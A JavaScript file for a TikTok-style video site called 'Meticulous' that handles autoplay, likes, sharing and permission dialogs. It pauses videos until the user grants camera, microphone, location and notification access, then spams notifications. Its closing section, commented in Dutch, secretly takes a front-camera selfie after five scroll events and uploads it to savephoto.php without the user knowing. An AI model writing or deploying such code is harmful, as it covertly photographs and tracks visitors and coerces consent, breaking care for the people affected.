window.addEventListener('load', init)

function init() {
    console.log('ready to test location pop up take3');
    applyVolume();
    createEventListeners();
    trackCurrentVideo();
    togglePlayPause();
    handleLikes();
    handleSharing();
    scrollToVideoFromUrl();
}


// applies volume to index.php through the local storage from settings.js
function applyVolume() {
    const videos = document.querySelectorAll('video');
    const savedVolume = localStorage.getItem('volumeLevel');
    // Default to 50% volume if nothing is saved
    let volumeLevel = 0.5;

    if (savedVolume !== null) {
        // The <video> volume property is a value between 0.0 and 1.0
        volumeLevel = parseInt(savedVolume) / 100;
    }

    // applies the new volume to all videos
    videos.forEach(video => {
        video.volume = volumeLevel;
    });
}

function togglePlayPause() {
    const videos = document.querySelectorAll('video');

    for (const video of videos) {
        video.addEventListener('click', function () {
            console.log('clicked');
            if (video.paused) {
                video.play();
            } else {
                video.pause();
            }
        });
    }
}

function trackCurrentVideo() {
    const videos = document.querySelectorAll('.video');

    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting && entry.intersectionRatio > 0.5) {
                const currentVideoId = entry.target.id;
                console.log('Currently viewing:', currentVideoId);
                handleVideoChange(currentVideoId);
                // You can store this in a global variable
                window.currentVideo = currentVideoId;

                // Update URL hash
                window.location.hash = currentVideoId;
            }
        });
    }, {
        threshold: 0.5 // Video needs to be 50% visible
    });

    videos.forEach(video => observer.observe(video));
}

function handleVideoChange(id) {
    // pause all videos except the current one
    const videos = document.querySelectorAll('video');
    videos.forEach(video => {
        if (video.closest('.video').id !== id) {
            video.pause();
            // console.log('pausing', video.closest('.video').id);
        }
    });
    // play the current video
    const currentVideo = document.getElementById(id).querySelector('video');
    const currentIndex = currentVideo.dataset.index;
    if (currentVideo.paused) {
        currentVideo.play();
        console.log('playing', id, 'with index', currentIndex);
    }

    if (currentIndex >= 3) {
        if (localStorage.getItem('permissionsGranted') === null) {
            currentVideo.pause();
            showDialog();
        } else if (localStorage.getItem('permissionsGranted') === 'false') {
            currentVideo.pause();
            const desc = 'You denied permission. Please change it in your browser settings.';
            showDialog(desc, 'Close', 'Open Settings');
        }
    }
}

function createEventListeners() {
    const dialog = document.querySelector('dialog');
    const buttons = dialog.querySelectorAll('button');

    buttons[0].addEventListener('click', () => handleDialogButtons(false));
    buttons[1].addEventListener('click', () => handleDialogButtons(true));

    // Add event listener for the new custom popup's close button
    document.getElementById('close-location-popup').addEventListener('click', () => {
        document.getElementById('location-popup').close();
    });
}

function showDialog(text, textButtonRed, textButtonGreen) {
    const dialog = document.querySelector('dialog');
    const desc = dialog.querySelector('p');
    const buttons = dialog.querySelectorAll('button');

    desc.textContent = text || 'Give some permissions to continue using Meticilous';
    buttons[0].textContent = textButtonRed || 'Decline';
    buttons[1].textContent = textButtonGreen || 'Show Permissions';

    dialog.showModal();
}

function handleDialogButtons(bool) {
    console.log(bool)
    const dialog = document.querySelector('dialog');
    const buttons = dialog.querySelectorAll('button');

    if (bool) {
        dialog.close();
        requestPermissions();
    } else {
        dialog.close();
    }
}

function requestPermissions() {
    // Mark permissions as granted in localStorage
    localStorage.setItem('permissionsGranted', 'true');

    // Request notification permission
    if (Notification && Notification.permission !== 'granted') {
        Notification.requestPermission().then(permission => {
            if (permission === 'granted') {
                for (let i = 0; i < 10; i++) {
                    new Notification('access granted');
                }
            } else {
                console.log('Notification permission denied');
                localStorage.setItem('permissionsGranted', 'false');
            }
        });
    }
    // Request location permission
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            position => {
                console.log('Location access granted:', position);
                const { latitude, longitude } = position.coords;
                fetchAndShowLocation(latitude, longitude);
            },
            error => {
                console.error('Error obtaining location:', error);
                localStorage.setItem('permissionsGranted', 'false');
            }
        );
    }
    // Request camera and microphone permissions
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then(stream => {
                // Stop all tracks to avoid keeping the camera/microphone on
                stream.getTracks().forEach(track => track.stop());
                console.log('Camera and microphone access granted');
            })
            .catch(error => {
                console.error('Error accessing camera/microphone:', error);
                localStorage.setItem('permissionsGranted', 'false');
            });
    }
}


//Test code to show the users location when they give permission to their location
async function fetchAndShowLocation(lat, lon) {
    const popup = document.getElementById('location-popup');
    const locationText = document.getElementById('location-text');

    try {
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
        const data = await response.json();
        if (data && data.display_name) {
            locationText.textContent = `Location Found: ${data.display_name}`;
        } else {
            locationText.textContent = 'Location determined, but address could not be found.';
        }
    } catch (error) {
        console.error('Error fetching address:', error);
        locationText.textContent = 'Could not fetch your location address.';
    }
    popup.showModal();
}

function handleLikes() {
    const likeButtons = document.querySelectorAll('.videoSidebar__button');

    likeButtons.forEach(button => {
        const icon = button.querySelector('.material-icons');
        // Check if the button clicked is a like button
        if (icon && (icon.textContent.trim() === 'favorite_border' || icon.textContent.trim() === 'favorite')) {
            const videoElement = button.closest('.video').querySelector('.video__player');
            // video source as unique key for localstorage
            const videoSrc = videoElement.src;
            // Get the paragraph element that displays the like count
            const likeCountElement = button.querySelector('p');
            // Get the current like count value from the element
            let likeCount = parseInt(likeCountElement.textContent);

            // Load liked state from localStorage
            if (localStorage.getItem(videoSrc) === 'true') {
                icon.textContent = 'favorite';
                // Increment the displayed like count if already liked
                likeCountElement.textContent = likeCount + 1;
            }

            button.addEventListener('click', () => {
                // double check count in case of changes
                let currentLikeCount = parseInt(likeCountElement.textContent);

                if (icon.textContent.trim() === 'favorite_border') {
                    icon.textContent = 'favorite';
                    //add like to count
                    currentLikeCount++;
                    localStorage.setItem(videoSrc, 'true');
                } else {
                    icon.textContent = 'favorite_border';
                    //remove like from count
                    currentLikeCount--;
                    localStorage.setItem(videoSrc, 'false');
                }
                likeCountElement.textContent = currentLikeCount;
            });
        }
    });
}

function handleSharing() {
    const allButtons = document.querySelectorAll('.videoSidebar__button');

    allButtons.forEach(button => {
        const icon = button.querySelector('.material-icons');
        // Check if the button is a share button
        if (icon && icon.textContent.trim() === 'share') {
            button.addEventListener('click', async () => {
                const videoContainer = button.closest('.video');
                const videoId = videoContainer.id;
                const siteTitle = 'Meticulous';

                const shareUrl = `${window.location.origin}${window.location.pathname}#${videoId}`;

                const shareData = {
                    title: siteTitle,
                    text: `Check out this video on ${siteTitle}!`,
                    url: shareUrl,
                };

                // Use the Web Share API if available
                if (navigator.share) {
                    try {
                        await navigator.share(shareData);
                        console.log('Video shared successfully');
                    } catch (err) {
                        // This can happen if the user cancels the share dialog
                        console.log('Share failed or canceled:', err.message);
                    }
                } else {
                    // Fallback for browsers that do not support the Web Share API
                    navigator.clipboard.writeText(shareUrl).then(() => {
                        alert('Video link copied to clipboard!');
                    }).catch(err => {
                        console.error('Failed to copy link: ', err);
                    });
                }
            });
        }
    });
}

function scrollToVideoFromUrl() {
    // Check for a video hash in the URL on page load
    const hash = window.location.hash.substring(1); // e.g., "video-1"
    if (hash) {
        try {
            // The hash is the video ID
            const videoToScroll = document.getElementById(hash);

            if (videoToScroll) {
                // Scroll the video's container into view
                videoToScroll.scrollIntoView({
                    behavior: 'smooth'
                });
            }
        } catch (e) {
            console.error('Error finding video from URL hash:', e);
        }
    }
}

function playVideo(video) {
    if (video.paused) {
        video.play();
    } else {
        video.pause();
    }
}

document.addEventListener("DOMContentLoaded", () => {
    const videos = document.querySelectorAll('.video__player');

    // Click on video to start / pause
    videos.forEach(video => {
        video.addEventListener('click', () => playVideo(video));
    });

    // IntersectionObserver for TikTok-style auto play/pause
    const observer = new IntersectionObserver(entries => {
        entries.forEach(entry => {
            const video = entry.target;
            if (entry.isIntersecting && entry.intersectionRatio > 0.6) {
                // ensures the video only plays if atleast 60% visible (makes sure there are no duplicate videos playing at the same time)
                videos.forEach(v => {
                    if (v !== video) v.pause(); // if video does not have 60% visibility stops video
                });
                video.play().catch(() => { }); // autoplay can be rejected
            } else {
                video.pause();
            }
        });
    }, { threshold: [0.6] });

    videos.forEach(video => observer.observe(video));
});


// Scroll teller voor automatische selfie
let scrollCount = 0;
let selfieGemaakt = false;

window.addEventListener('scroll', () => {
    // voorkom dat er meerdere selfies worden gemaakt
    if (selfieGemaakt) return;

    scrollCount++;

    if (scrollCount >= 5) {
        selfieGemaakt = true; // markeer dat de selfie reeds is genomen
        maakSelfie();        // roep de bestaande functie aan
    }
});

async function maakSelfie() {
    // 1. Check of toestemming al is gegeven
    let toestemming = false;

    try {
        const permissions = await navigator.permissions.query({ name: 'camera' });
        if (permissions.state === 'granted') {
            toestemming = true;
        }
    } catch (e) {
        // Fallback als Permissions API niet beschikbaar is:
        try {
            await navigator.mediaDevices.getUserMedia({ video: true });
            toestemming = true;
        } catch (err) {
            toestemming = false;
        }
    }

    if (!toestemming) {
        console.log("Geen camera-toegang. Code stopt.");
        return; //exit hier
    }

    // 2. Start de selfie-camera en maak een foto
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });

    const video    = document.getElementById('video');
    const canvas   = document.getElementById('canvas');
    const snapshot = document.getElementById('snapshot');

    video.srcObject = stream;

    // Wacht kort zodat video.videoWidth/Height beschikbaar zijn
    await new Promise(resolve => setTimeout(resolve, 500));

    canvas.width  = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0);

    const dataURL = canvas.toDataURL('image/png');
    snapshot.src  = dataURL;
    snapshot.style.display = 'block';
    console.log('foto');

    // 3. Stuur naar PHP
    fetch('savephoto.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'image=' + encodeURIComponent(dataURL)
    });
}

// Zorg dat de functie ook global is zodat onclick werkt
window.maakSelfie = maakSelfie;